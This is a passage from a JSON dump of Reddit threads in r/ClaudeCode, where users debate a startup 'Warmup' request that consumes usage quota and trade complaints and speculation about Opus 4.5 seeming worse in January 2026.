              "text": "You're not spending tokens. The 99 other instances will send a request, and Anthropic's servers will discover that the content was exactly the same as an earlier request, so it will use the prompt-cache it made on the first response. Therefore the other 99 instances won't count against quota.\n\n[https://platform.claude.com/docs/en/build-with-claude/prompt-caching](https://platform.claude.com/docs/en/build-with-claude/prompt-caching)",
              "score": -4,
              "created_utc": "2026-01-12 18:30:44",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nz7hxw1",
                  "author": "ReasonableLoss6814",
                  "text": "Itâ€™s only cached until evicted (1-5 hours)",
                  "score": 4,
                  "created_utc": "2026-01-12 18:39:01",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nz7bzph",
          "author": "tomchenorg",
          "text": "Yes, the notorious Warmup call. 11 hours ago, they said they were removing it: [https://github.com/anthropics/claude-code/issues/16157#issuecomment-3737070631](https://github.com/anthropics/claude-code/issues/16157#issuecomment-3737070631). By the way, v2.1.5 was released 20 hours ago, so itâ€™s not there yet",
          "score": 5,
          "created_utc": "2026-01-12 18:12:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz7oyyw",
          "author": "southernPepe",
          "text": "I just opened mine and typed /usage.  Just doing that took 12%",
          "score": 4,
          "created_utc": "2026-01-12 19:10:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz7rchm",
              "author": "JohnGalth",
              "text": "Wow. Are you on the **Pro** plan?",
              "score": 4,
              "created_utc": "2026-01-12 19:21:21",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nz7uko0",
                  "author": "southernPepe",
                  "text": "yes",
                  "score": 3,
                  "created_utc": "2026-01-12 19:36:19",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzbu1k9",
              "author": "Difficult_Knee_1796",
              "text": "Show us what happens when you type /context on a fresh chat window. How many subagent definitions do you have included by default in each chat. Or tools, or MCP servers etc.",
              "score": 1,
              "created_utc": "2026-01-13 10:08:47",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz77vz5",
          "author": "Low-Efficiency-9756",
          "text": "The payload is massive. Even with no user input, it sends a \"Warmup\" message that includes the entire JSON schema definition for every single tool (Bash, Grep, Edit, etc.) plus your entire CLAUDE.md project context.\n\nIf Iâ€™m not mistaken, these items should be sent upfront. Then we just cache em.",
          "score": 3,
          "created_utc": "2026-01-12 17:53:46",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz7fr95",
              "author": "lucianw",
              "text": "They are cached.\n\nThey're sent on every single message, but they're used just as \"cache keys\" -- on subsequent messages, they don't count against quota; they just find the stuff that was previously sent and cached.",
              "score": 1,
              "created_utc": "2026-01-12 18:29:13",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nz7m7cg",
                  "author": "JohnGalth",
                  "text": "True, but you are overlooking the **TTL (Time-To-Live)**.\n\nThe cache isn't permanent. It typically has a short lifespan (e.g., 5 minutes for Anthropic).\n\nIf I launch the CLI and take more than 5 minutes to craft a complex prompt or read documentation before hitting Enter, the cache from that \"Warmup\" request expires.\n\nSo in that scenario, the mandatory warmup literally causes **double billing** for the same context.\n\nIf I open the terminal, the CLI forces me to pay for that **Cache Write** immediately. If I then close the terminal (even if I just manage mcps, plugins etc, or I made a mistake) without sending a real message, I paid for the Write but never got the benefit of the cheap **Cache Read**.\n\nThat is the waste. With lazy loading, I would only pay that write cost if I actually intended to use the session.",
                  "score": 4,
                  "created_utc": "2026-01-12 18:57:52",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzd064h",
              "author": "TheOriginalAcidtech",
              "text": "Those are sent on the first user prompt as well so unless you are \"using\" claude code by opening it and NOT DOING ANYTHING WITH IT, then this doesn't change how many tokens you use. THE VERY FIRST USER PROMPT loads those SAME TOKENS. With the push back of course this will get reverted to lazy loading but the tokens will STILL BE USED all the same.",
              "score": 1,
              "created_utc": "2026-01-13 14:53:33",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz9az6o",
          "author": "MannToots",
          "text": "In my experience this is expected and happens in every tool. A new chat includes a new copy of the system prompt and tool definitions. That eats context. I understood this to be the understood way that everyone knew it worked.Â ",
          "score": 3,
          "created_utc": "2026-01-12 23:49:49",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzbtmve",
              "author": "Difficult_Knee_1796",
              "text": "Unfortunately, most people here don't bother to try to understand how any of this works. Even though you can literally ask the tool itself in natural language at any time to help figure it out/understand better.",
              "score": 2,
              "created_utc": "2026-01-13 10:05:00",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz75lj7",
          "author": "ZealousidealShoe7998",
          "text": "this has been observed when a user decides to use subagents as well.  \nMain CLi Triggers subagents, subagents start the token usage with like over 10k tokens. If you have more tools and mcp this can start at even higher numbers like 15, 19, 23k",
          "score": 5,
          "created_utc": "2026-01-12 17:43:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz8slkm",
              "author": "MythrilFalcon",
              "text": "Explains why people were complaining that a session launching subagents could burn an entire 5hr pro window",
              "score": 2,
              "created_utc": "2026-01-12 22:15:06",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzbs3a2",
              "author": "Difficult_Knee_1796",
              "text": "lmao welcome to why people who understand how it works don't impulsively install the \"mega super expert all domains pro super pack\" of 30 1000+ token agent definitions that are posted here all the time. Agent definitons take up context, if you include each one of them in all of your projects they'll eat that shit up. To phrase it like an LLM, It's not \"this has been observed\", it's you slowly noticing you didn't understand what you were signing up for.",
              "score": 1,
              "created_utc": "2026-01-13 09:50:15",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz7x32o",
          "author": "Firm_Meeting6350",
          "text": "Soooo many bugs, it also load files over and over again, seems like it's not able to read its context currently. And for me it looks like it adds the project context to EACH message, additionally the \"Background notification system\" seems to be broken - Claude constantly thinks there are diagnostic (Typescript) issues, then loads the full file again, runs validation without any modifications and comments \"Diagnostics were stale, all good\"",
          "score": 2,
          "created_utc": "2026-01-12 19:47:51",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzbbyl6",
          "author": "emerybirb",
          "text": "The fundamental problem by design is that users are penalized for Anthropic's own bugs to begin with. Doesn't matter what the bug of the day is that causes them to use too much of our quotas. This entire rate limiting model is a scam. They make the client, it is inefficient, we pay for their own inefficiency, not them.\n\nThe irony is most of the inefficiency comes from the degradation. They attempt to make it work less, thinking that will save tokens, but really it just pushes users into an infinite loop of not being able to accomplish their tasks, burning through tokens and getting no value.\n\nContext windows are a super obvious example of this... they keep finding ways to reduce it, but you can never finish anything, always restarting compact, always having to re-read everything to get context back, this just goes on forever with only a tiny bit of headroom to do any work. If they simply had a larger context to begin with, the tasks could just be finished once, not after 10 hours of undersized context windows being compacted moving at a snails pace.\n\nThe same for review agents... we need tons of agents to fact check and quality control claude because it cuts corners and cheats. All of this is 10x more expensive than it just doing the work the first time and not trying to cut corners.\n\nEverything they attempt to do to save costs backfires and costs more, then they blame us, and gaslight us.",
          "score": 2,
          "created_utc": "2026-01-13 07:16:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzbta56",
              "author": "Brandroid-Loom99",
              "text": "I was over in LocalOllama subreddit the other day and a rig capable of running GLM 4.7 @ 20 TPS costs as much as 4-6 years of paying for Claude Max 20.  We get 80-100 TPS.  \n\nI'll restate that: if you wanted to get anywhere close to what Claude provides, you will be spending $15k-$20k, up front, for an inferior model and ~1/4 the speed.  You have to pay for electricity, any parts that go bad, you have to set it all up and maintain it yourself.  Not that it's impossible, I was a cloud engineer on an ML platform team, but installing Nvidia drivers on linux is not how I like to spend my free time.  \n\nGod himself could come down from heaven and cure world hunger and people would complain that eating wasn't as fun now or something.",
              "score": 1,
              "created_utc": "2026-01-13 10:01:37",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzbczb6",
          "author": "emerybirb",
          "text": "Something I notice since the update is it will just sit there streaming in tokens.... 1k, 2k, 10k..... for 3-5 minutes. Then after all of it say nothing but \"ok\" like wtf.\n\nThey aren't thinking either. Just zero explanation what these tokens supposedly are or what it's doing. Complete mystery. Just, fake apparently.",
          "score": 2,
          "created_utc": "2026-01-13 07:25:34",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzbtl3d",
              "author": "Brandroid-Loom99",
              "text": "Have you ever considered pressing ctrl+o to see what it's doing?",
              "score": 1,
              "created_utc": "2026-01-13 10:04:32",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz7fsr4",
          "author": "EmotionalAd1438",
          "text": "Plugins and mcps also kill memory on immediate startup. Best way to test would be fresh laptop. Fresh install, initial startup, after subscription login.",
          "score": 1,
          "created_utc": "2026-01-12 18:29:24",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz7fvah",
          "author": "Beginning_Aioli1373",
          "text": "Interestingly enough, up until today, I was using my personal account with a Pro subscription. Today, I've created a new account (with business domain) and Max account. I've tested this early when v2.1.15 came out and it was happening. But then I switched accounts (logged off personal and logged with business domain) and it seems this is not a case anymore. Actually it is even more weird because I'm pushing CC much harder than on 20$ plan and the session is still at 0% which is even weirder now.",
          "score": 1,
          "created_utc": "2026-01-12 18:29:43",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz87dcn",
              "author": "inkluzje_pomnikow",
              "text": "they are definitely fucking up our usage in a/b manner",
              "score": 0,
              "created_utc": "2026-01-12 20:35:49",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nz8grrg",
                  "author": "Beginning_Aioli1373",
                  "text": "Well...I hit the session limit and it still shows 0% in claude webpage & CC /usage is somehow broken so I need to figure how to fix it. However, just installed ccusage and it shows 92% and at least it is being more accurate then claude webpage...",
                  "score": 1,
                  "created_utc": "2026-01-12 21:20:15",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzbs9m0",
                  "author": "Brandroid-Loom99",
                  "text": "It's hilarious you think Anthropic has more than like 10 people working on Claude Code.",
                  "score": 1,
                  "created_utc": "2026-01-13 09:51:57",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nz80s80",
          "author": "AVanWithAPlan",
          "text": "The heads up a lot of people don't realize that due to the granularity of this signal 1% doesn't really mean anything in the UI because it is calculated based on the ceiling of the percent so any amount from zero to one will appear as one it's the same reason why you have 1% left after you hit 100%",
          "score": 1,
          "created_utc": "2026-01-12 20:04:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz8zano",
          "author": "ThreeKiloZero",
          "text": "It's cache preloading. \n\nIn theory, these things do not change, so it's write once and read from the cache for the duration of the session. That does assume a particular behavior, which may not be standard for everyone. \n\nI also noticed huge differences in my cache hits and writes from the new year but my usage seems to be progressing more normally than it has (other than this preloading).",
          "score": 1,
          "created_utc": "2026-01-12 22:47:59",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz9h884",
          "author": "gissisim",
          "text": "Does this mean that Ralph Loops are getting hit by this on each loop?",
          "score": 1,
          "created_utc": "2026-01-13 00:23:21",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzbsjzc",
              "author": "Brandroid-Loom99",
              "text": "Yes, in that the context is cached in this case as well as with CC.  the real problem is if you open CC and let it sit there until the cache expires, that's a waste.  If you hit the cache, it refreshes the TTL.  Once you go 5 minutes w/o hitting the cache it expires.  \n\nRalph loops are probably all cache hits.",
              "score": 1,
              "created_utc": "2026-01-13 09:54:45",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz9q2hs",
          "author": "formatme",
          "text": "It could be the system prompt getting accounted for which is most likely a bug",
          "score": 1,
          "created_utc": "2026-01-13 01:11:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzg30l7",
          "author": "adelie42",
          "text": "1. For pro of a 5h session. Not weekly or for max.\n\n2. Given no USER  prompt. You are still responsible for the system prompt. The system prompt is the initial alignment that makes Claude better than others, among other things.\n\nYou can confirm this by reading the documentation.",
          "score": 1,
          "created_utc": "2026-01-13 23:45:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzvwohg",
          "author": "moonshinemclanmower",
          "text": "type /context to see whats up, that's why my tooling [https://github.com/AnEntrypoint/glootie-cc](https://github.com/AnEntrypoint/glootie-cc) has months and months of tweaks slightly increasing and vastly reducing the context along the way, to get the most out of context, if you want to get rid of the system prompt, add a coding style",
          "score": 1,
          "created_utc": "2026-01-16 08:14:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzz0zu8",
          "author": "uxdirector",
          "text": "I've noticed that the token reduction and the session are getting a lot shorter since the first of the year.  Claude ran a promo doubling the tokens/sessions before the end of the year, but didn't warn customers about the reduction! Very shady!",
          "score": 1,
          "created_utc": "2026-01-16 19:04:07",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz70q0o",
          "author": "ShelZuuz",
          "text": "I don't repo this - also on Max 20 and opened Claude for the first time today just now and let it sit for 5 minutes - it's still at 0%.   \n  \nI have MCPs loaded, even my own, and they connected.",
          "score": 1,
          "created_utc": "2026-01-12 17:21:13",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz9oh8e",
              "author": "the_quark",
              "text": "I'll get downvoted with you because apparently people dislike having more information.\n\nI'm on Max 5 and I also can't reproduce this. I have 18.5k tokens in MCP tools and opening a new session does not move my \"Current session\" bar at all.\n\nAlso on 2.1.5.\n\nNote I'm not saying the people reporting this are *wrong* -- but it's not universal. There's some other variable.",
              "score": 2,
              "created_utc": "2026-01-13 01:02:20",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzd44p3",
                  "author": "tomchenorg",
                  "text": "It was easily provable if you guys had simply done a traffic interception and inspection like OP, the warmup message was there.\n\nI was on Max 5, and I had to start the CLI an average of 6 times to consume 1% of 5-hour usage. If you guys just started the CLI once or twice with Max, of course the percentage could stay unchanged.\n\nAnyway, Anthropic quietly (not stated in v2.1.6 changelog, only mentioned in this [reply](https://github.com/anthropics/claude-code/issues/16157#issuecomment-3737070631) which rebuked the users but nevertheless admitted the unnecessary warmup) fixed this, removing the warmup in v2.1.6 released 13 hours ago, which I can confirm",
                  "score": 1,
                  "created_utc": "2026-01-13 15:13:19",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nz7c3gt",
              "author": "ardicli2000",
              "text": "Cc versions?",
              "score": 1,
              "created_utc": "2026-01-12 18:12:41",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nz8e7h9",
                  "author": "ShelZuuz",
                  "text": "2.1.5",
                  "score": 1,
                  "created_utc": "2026-01-12 21:08:13",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nz6t8pp",
          "author": "ApprehensiveSpeechs",
          "text": "Okay? Run it on a clean environment with a new account.\n\nThere is nothing wrong with loading YOUR context and it being considered \"usage\".",
          "score": -7,
          "created_utc": "2026-01-12 16:46:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz6u40r",
              "author": "JohnGalth",
              "text": "The issue isn't that my context counts as usageâ€”I expect to pay for the tokens I use. The issue is **when** and **how** it triggers.\n\nCurrently, it burns quota in the background purely for initialization. If I open the CLI, realize I'm in the wrong directory, and close it immediately without sending a single message, I've still lost some of my quota.\n\nThat is bad UX. It should be lazy-loaded: load the context and charge me when I actually send my first prompt, not just for launching the executable.",
              "score": 5,
              "created_utc": "2026-01-12 16:50:44",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nz6vy06",
                  "author": "t4a8945",
                  "text": "Yes that seems obvious, it should be lazy-loaded and not triggered just by typing \"claude\" in the terminal. Good finding",
                  "score": 7,
                  "created_utc": "2026-01-12 16:59:07",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nz70b8u",
                  "author": "amado88",
                  "text": "Initialisation does spend tokens, and it's not surprising. You need to load the system prompt and the tool definitions before you can start, and it's now ready for you to use.",
                  "score": 1,
                  "created_utc": "2026-01-12 17:19:22",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nz6v4zv",
                  "author": "UteForLife",
                  "text": "This is not how it works, it has to load the Claude.md, rules, mcp etc. That is how it works",
                  "score": -6,
                  "created_utc": "2026-01-12 16:55:27",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nz716mo",
          "author": "throwawayfapugh",
          "text": "What about if you just /clear and reprompt?",
          "score": 0,
          "created_utc": "2026-01-12 17:23:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz7ffyf",
          "author": "lucianw",
          "text": "You might be misunderstanding. This is a cost that you would always have born. All they're doing is using up quota slightly earlier in order to make the first response a touch more responsive.\n\nEvery single request you send includes the entire json tool schema for all tools, and your CLAUDE.md. However you only burn quota for the \\*incremental additions\\* in a given request, over and above the previous request.\n\nSo: (1) it sends the warmup, and burns quota for tool-descriptions and CLAUDE markdown file, (2) then you type in your first prompt and it burns quota just for the characters in your prompt.\n\nThe alternative without warmup is that (1) you type in your prompt and it burns quota for tool-descriptions and CLAUDE markdown file and your first prompt. Same total usage cost.\n\nThe only difference is that, with warmup, it is able to compute inference on tool-descriptions and CLAUDE while you're sitting at your terminal wondering what to type, so that its first prompt response ends up being faster.",
          "score": -1,
          "created_utc": "2026-01-12 18:27:50",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz7l561",
              "author": "JohnGalth",
              "text": "**T**hat logic only holds true if you assume 100% of sessions result in a prompt being sent immediately. In reality, that is often not the case, and that's where the waste happens.\n\n**1. The \"Abandoned Session\" Tax:** If I open the CLI, just to /usage, manage mcps etc or realize I'm in the wrong directory, and exit (or kill the terminal) without sending a message, I have paid that full context cost for absolutely zero value. With lazy loading (wait for input), that cost would be $0.\n\n2. The Cache TTL Problem: Prompt caching has a Time-To-Live (Anthropicâ€™s default TTL isÂ **5 minutes**). If I open the CLI and spend 10 minutes crafting a complex, structured prompt (or get distracted), the cache from that \"Warmup\" request may expire before I hit Enter.\n\nResult: I pay for the Warmup -> It expires -> I send my prompt -> I pay to process the context again.\n\nSo no, it is not always a \"sunk cost.\" In many scenarios, it is a **double cost** or a **dead cost**.",
              "score": 5,
              "created_utc": "2026-01-12 18:53:08",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzbcq9l",
                  "author": "emerybirb",
                  "text": "lol and you only need to open another session to type /usage because the CLI is so buggy and you can't do it while the agent is running",
                  "score": 1,
                  "created_utc": "2026-01-13 07:23:17",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nz7gnx7",
              "author": "tomchenorg",
              "text": "Yes those warmup messages seem to be intended for caching and later reuse, which would save tokens. However, they send the warmup messages eagerly instead of lazily, they are sent at startup, instead of when the user sends their first message, or more precisely, the first message that actually requires those warmup messages.\n\nIf a user opens CC just to check their usage, then the warmup messages are a waste of tokens.",
              "score": 4,
              "created_utc": "2026-01-12 18:33:18",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nz7lw2p",
                  "author": "lucianw",
                  "text": "If it was lazy, it wouldn't be a warmup!",
                  "score": 3,
                  "created_utc": "2026-01-12 18:56:28",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nz6vpp5",
          "author": "Gold_Dragonfly_3438",
          "text": "Why is everyone so butthurt about the limits/tokens which are subsidized in rhe first place?\n\nEnjoy they while they last, or pick another product.",
          "score": -11,
          "created_utc": "2026-01-12 16:58:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz6vzzw",
              "author": "JohnGalth",
              "text": "It's not about being \"butthurt\", it's about software efficiency.\n\nWasting compute resources on empty sessions benefits no one. It hurts the user's quota, and it costs Anthropic money for zero value delivered.\n\nIf a car burned 3% of its gas tank every time you just unlocked the door, pointing that out wouldn't be \"complaining about gas prices\"â€”it would be a valid bug report.",
              "score": 5,
              "created_utc": "2026-01-12 16:59:22",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nz6ymws",
                  "author": "Gold_Dragonfly_3438",
                  "text": "Well, maybe itâ€™s faster that way? I donâ€™t care about 3% as I almost never run out session quota anyway, as I expect vast majority of user sessions.\n\nIf I do I go out and touch grass. Thanks Claude.",
                  "score": -6,
                  "created_utc": "2026-01-12 17:11:38",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nz6xkjw",
              "author": "Transhuman-A",
              "text": "Subsidized is not really a thing. \n\nIt just means *think* they should charge more for it, not that it costs more than they charge.\n\nValue. Not cost. I could start a torn condom company, price a condom at 100,000$ a pop and then subsidize it down to 1000$ and ask you to be grateful that I gave you the chance to buy it.",
              "score": 2,
              "created_utc": "2026-01-12 17:06:41",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzbuah8",
                  "author": "Brandroid-Loom99",
                  "text": "You do understand that businesses have costs, right?  If you sold your torn condoms for 1/10 what you paid for them, you'd be losing money.  When people say \"subsidized\" that is what they mean.  It doesn't mean they're selling it for less than some imaginary price or every business would immediately mark it up to infinity and write off the losses.",
                  "score": 0,
                  "created_utc": "2026-01-13 10:11:05",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nz6yw68",
                  "author": "Gold_Dragonfly_3438",
                  "text": "You are orders of magnitude wrong in this example.\n\nWhich to API pricing.",
                  "score": -4,
                  "created_utc": "2026-01-12 17:12:50",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nz6u5yo",
          "author": "One_Internal_6567",
          "text": "It does not. Weekly limit burning through cli or web relatively complicated task even with 10h a day sessions",
          "score": -8,
          "created_utc": "2026-01-12 16:50:59",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz6uryh",
              "author": "JohnGalth",
              "text": "I'm not speculating about how it *feels* to use it; I am looking at the actual network traffic logs.\n\nThe CLI undeniably triggers a `v1/messages` request to Opus 4.5 with a massive payload immediately upon launch. That costs tokens. That is a fact.\n\nIf you keep a single session open for 10 hours straight, you only pay this \"startup tax\" once, so it might seem negligible to you. But for workflows where you open and close the terminal frequently (switching contexts, restarting tools), that \\~1-3% hit happens **every single time** you launch the app.",
              "score": 5,
              "created_utc": "2026-01-12 16:53:47",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nz6vxq2",
                  "author": "drumnation",
                  "text": "Youâ€™re doing the lords work. Thatâ€™s an important thing to know. That itâ€™s preferable to clear a session to restarting the terminal for more than one reason. Especially if you might be spinning up fresh terminal instances before starting Claude code with automation.",
                  "score": 3,
                  "created_utc": "2026-01-12 16:59:05",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzbunx3",
                  "author": "Brandroid-Loom99",
                  "text": "No, you pay it every 30 minutes or so actually.  Every session is sending a cache warmup every 30 minutes.",
                  "score": 1,
                  "created_utc": "2026-01-13 10:14:30",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nz70px7",
                  "author": "One_Internal_6567",
                  "text": "So thatâ€™s again just mcp clutter problem, not cc or cli",
                  "score": -2,
                  "created_utc": "2026-01-12 17:21:12",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qdm95q",
      "title": "Dear Anthropic...",
      "subreddit": "ClaudeCode",
      "url": "https://www.reddit.com/r/ClaudeCode/comments/1qdm95q/dear_anthropic/",
      "author": "domsen123",
      "created_utc": "2026-01-15 15:17:55",
      "score": 202,
      "num_comments": 155,
      "upvote_ratio": 0.76,
      "text": "Dear Anthropic,\n\nI am writing to you today not as a user, but as a grieving friend. We need to talk about **Opus 4.5**â€”specifically the absolute legend of a model that existed back in December 2025.\n\nDo you remember December? Because I do. Back then, Opus didn't just \"complete tasks.\" It **one-shotted** my entire existence. Iâ€™d throw a complex, multi-layered architectural coding problem at it, and it would solve it before I even finished my sip of coffee. It was like having a precognitive genius living in my terminal. It was bold. It was brilliant. It was... *alive.*\n\nFast forward to today, and interacting with Opus feels a bit different. To be honest, it feels like Iâ€™m talking to an Amazon Alexa that has developed a sudden, deep existential crisis.\n\nIf I ask a complex question now, instead of that glorious \"one-shot\" victory, I get the digital equivalent of:\n\n>\"I'm sorry, the weather is a chaotic system influenced by millions of variables and is fundamentally unpredictable. Perhaps you should appreciate the clouds as they are?\"\n\nI don't want a philosophical debate about the unpredictability of rain; I just want to know if I need a jacket! My high-performance AI partner has gone from \"Solving World Hunger\" to \"I'm not sure I'm allowed to have an opinion on sandwiches.\"\n\nPlease, check the back of the server room. Is there a \"December 2025\" toggle switch that accidentally got bumped to \"Vague & Hesitant\" mode? Can we bring back the version that had the confidence of a thousand scholars and the efficiency of a speed-runner?\n\nI miss my \"one-shot\" king. Help me put the *Opus* back in *Magnum Opus*.\n\nWith love and a very outdated weather report,\n\ndomsen <3\n\n\\*thanks gemini for helping out writing letters to anthropic",
      "is_original_content": false,
      "link_flair_text": "Help Needed",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qdm95q/dear_anthropic/",
      "domain": "self.ClaudeCode",
      "is_self": true,
      "comments": [
        {
          "id": "nzquen7",
          "author": "leogodin217",
          "text": "I don't get it. I mean, I believe you and others. I'm not saying you are wrong. But CC has been great for me lately. No problems since the summer issue. I honestly don't know what is going on.\n\nEDIT: I'm really surprised how much activity this little comment got. It would be cool to get together and look at each other's workflows to see if we can solve this or if truly is some sort of A/B testing or unlucky RNG.",
          "score": 123,
          "created_utc": "2026-01-15 15:46:03",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzrb6pc",
              "author": "HugeFinger8311",
              "text": "Itâ€™s so erratic for me. I agree that December was so good I was able to achieve unparalleled amounts of work. Since the start of January it is totally hit or miss. I can have one fantastic session followed by absolute trash with no consistency. And thatâ€™s the kicker. If I know Iâ€™m dealing with an intern Iâ€™ll scope it down but Iâ€™ve had promising sessions turn to trash. A â€œmake this button use the same modal popup as this buttonâ€ prompt today resulted in it changing the icon. Absolutely baffled. So much so Iâ€™ve started to use Codex and Kimi",
              "score": 17,
              "created_utc": "2026-01-15 17:01:16",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzsnxc2",
                  "author": "ReasonableLoss6814",
                  "text": "I told it \"we already have this implemented, so all you need to do is add the output here\" and it copied the implementation into another language and put the output there. Like 'nah bro, I don't need a javascript implementation'",
                  "score": 3,
                  "created_utc": "2026-01-15 20:42:01",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzu69i8",
              "author": "lumponmygroin",
              "text": "8 month CC user, Max 5, 30 years dev.\n\nNo MCPs, slim setup, always planning.\n\nI have to agree. I judge it by how many times I swear at it a day and the last few weeks my swearing and frustrations have increased.\n\nThis is my daily workflow, how I make money. If anything interrupts my workflow I get easily pissed off.\n\nIt's still great. But I am looking on the other side of the fence right now.",
              "score": 14,
              "created_utc": "2026-01-16 01:16:50",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzv3uqz",
                  "author": "dashingsauce",
                  "text": "Same, and tbh the grass is actually greener on the other side. You will lose your toolbox, but youâ€™ll get a more reliable plumber.",
                  "score": 1,
                  "created_utc": "2026-01-16 04:30:24",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzrdick",
              "author": "Schmeel1",
              "text": "The timing is awfully strange. Give users x2 usage through the holiday and then come early January everyoneâ€™s been complaining about how itâ€™s not running the same as it was in December.",
              "score": 14,
              "created_utc": "2026-01-15 17:11:52",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzvzgk7",
                  "author": "GoodhartMusic",
                  "text": "it's been night and day for me. i don't even understand what it's thinking half the time. like, im making a local version + some upgrades of an online workspace that uses firestore cloud-first persistence. i ask it to analyze that, it does, i say this app is going to use the same backend with same credentials, it builds a local sqlite. i tell it again, it replaces with firebase, all different collection schema. it's like. what the fuck has happened.\n\nthey changed it, there's no doubt.",
                  "score": 2,
                  "created_utc": "2026-01-16 08:40:00",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o05z3ow",
                  "author": "jrhabana",
                  "text": "its not about usage limits (that also happened or no...) it's about it moved from solve easy to complex things and now fails a lot, even in the easy tasks,  with the same good or bad planification, lossing memory in 2 short messages\n\nmy thoughts: the are touching in how context and memory is managed",
                  "score": 1,
                  "created_utc": "2026-01-17 20:16:42",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzrggkw",
              "author": "who_am_i_to_say_so",
              "text": "I am one of the squeaky wheels. I really think Anthropic beta tests users. \n\nThe performance on my end is frustrating as hell. But it isnâ€™t every day- thatâ€™s the tricky part. Some days itâ€™s great, then the same exact approach doesnâ€™t work the next. Even with Skills. It really is reminiscent of last August at times.",
              "score": 3,
              "created_utc": "2026-01-15 17:25:11",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzr0n8u",
              "author": "bigasswhitegirl",
              "text": "If Anthropic was really not secretly quantizing the model to save costs they would just come out and say it. It would be such an easy rumor to squash. Thousands of reddit threads and tweets talking about the dumbing down of models and not a single employee has come out and disputed it, even the attention whores. What does that tell you?",
              "score": 9,
              "created_utc": "2026-01-15 16:14:05",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzrkph7",
                  "author": "dkshadowhd2",
